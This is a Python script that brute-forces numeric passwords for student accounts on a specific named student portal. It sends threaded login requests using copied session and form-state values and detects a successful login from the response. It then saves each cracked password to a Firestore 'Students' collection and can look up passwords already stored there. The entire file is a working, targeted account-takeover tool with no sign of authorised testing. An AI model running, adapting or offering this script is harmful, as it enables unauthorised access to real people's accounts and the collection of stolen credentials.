import requests
import json
import argparse
from concurrent.futures import ThreadPoolExecutor
import time
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore


cred = credentials.Certificate("C:\\Users\\satwi\\OneDrive\\Documents\\BruteIt\\bruteit-certificate.json")
firebase_admin.initialize_app(cred)

def addPasswordToFirestore(userid, password):

    db = firestore.client()
    data = {"password":password}
    db.collection('Students').document(userid).set(data)

def getPasswordFromFirestore(userid):

    fuserId = userid.replace("/", "-")
    db = firestore.client()
    doc_ref = db.collection('Students').document(fuserId).get()
    password = doc_ref.to_dict().get('password')
    return password

def findFirestoreStudent(userid):

    fuserId = userid.replace("/", "-")
    db = firestore.client()
    doc_ref = db.collection('Students').document(fuserId).get()
    return doc_ref.exists

#Sends a request to saksham portal with specified id and pasword
def attemptLogin(userId, password):
    url = 'https://saksham.sitslive.com/login'

    headers = {
    "accept": "*/*" ,
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7", 
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8", 
    "cookie": "ASP.NET_SessionId=w3xnaxbvl5d3j4gdz3xtlnf3", 
    "origin": "https://saksham.sitslive.com", 
    "priority": "u=1, i", 
    "referer": "https://saksham.sitslive.com/login", 
    "sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"", 
    "sec-ch-ua-mobile": "?0", 
    "sec-ch-ua-platform": "\"Windows\"", 
    "sec-fetch-dest": "empty", 
    "sec-fetch-mode": "cors", 
    "sec-fetch-site": "same-origin", 
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", 
    "x-microsoftajax": "Delta=true", 
    "x-requested-with": "XMLHttpRequest" 
    }

    payload = {
        "data-daw": "ScriptManager1=updatepanel%7CbtnLogin&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=GXq8WYlFoIyiG3kHh%2FyWm36EVSPnNg9oMUi9wBqeXZ5oLCwDaEF1fWGlZu6NIZKEGzs%2FZqM8kQDJ35ynh50OxuDTdeqaTh4wZe5gn2NIsPG1M9Ds%2BzDSx0hHu317Lrbw&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=k9EujBZLYjXQ6rTY4Kfb27V%2FFrBy8Ba23xg9ZaR9inInhEHhMnDnorNbGIO4S1IWOPs2u1aAPCkn5ieUxwSc0CgIlxhouE9FPckXsb%2F078IUjLS6AJvoaw3K%2F%2BAABCmEBzF1Ae469WWe4mDfDZPlJyLwg8Y3lH9jol6vnwidKeaSu%2FewI8Hnv04%2BBd2lhQqFFWErXV4tmCmIKvRSer%2FfDZ1HHrJ3Vk%2FQdhUnj8JX2LHHfAeU5ALRWJxbSolA%2FDYVhU8PM7E3jQd1FBYJtVrqHwAgbSxV%2B6dPvyEDYjFbaiHkiz84m5JxTVPK53KMH%2Bpa&txtLoginID="+userId+"&txtPassword="+password+"&ddlType=0&txtUserName=&__ASYNCPOST=true&btnLogin=Login",
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))

    if "pageRedirect" in response.text:
        return password
    else:
        return None

#batchSize is the no. of request to be sent at once
#start is the password to start from 
def bruteforceLogin(userId, start, batchSize=100, threads=10):
    p = start
    q = start + batchSize
    muserId = userId.replace("/", "%2F")
    fuserId = userId.replace("/", "-")


    while True:
        pool = ThreadPoolExecutor(threads)
        futures = []

        print(f"Bruteforcing passwords from: {p} to {q}")
        for i in range(p, q):
            future = pool.submit(attemptLogin, muserId, str(i))
            futures.append(future)

        for f in futures:
            if f.result() is not None:
                addPasswordToFirestore(fuserId, f.result())
                print(f"Password for {userId} is: {f.result()}")
                return
                
        p+=batchSize
        q+=batchSize



if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--uid', type=str, help='The user ID to bruteforce.')
    parser.add_argument('-s','--start', type=int, default=1000, help='The starting point for the bruteforce.')
    parser.add_argument('-b','--batchSize', type=int, default=100, help='The size of each batch of passwords to try (default: 100).')
    parser.add_argument('-t','--threads', type=int, default=10, help='The number of threads to use (default: 10).')
    args = parser.parse_args()
    

    if args.uid is None:
        print("Error: Please provide a userId with -u")
        quit()

    if findFirestoreStudent(args.uid) is False:
        
        start_time = time.perf_counter()

        bruteforceLogin(args.uid, args.start, args.batchSize, args.threads)

        end_time = time.perf_counter()
        elapsed_time = str(end_time - start_time)[:5]
        print(f"Time taken: {elapsed_time} seconds")

    else:
        print(f"Password found in database for {args.uid}: {getPasswordFromFirestore(args.uid)}")
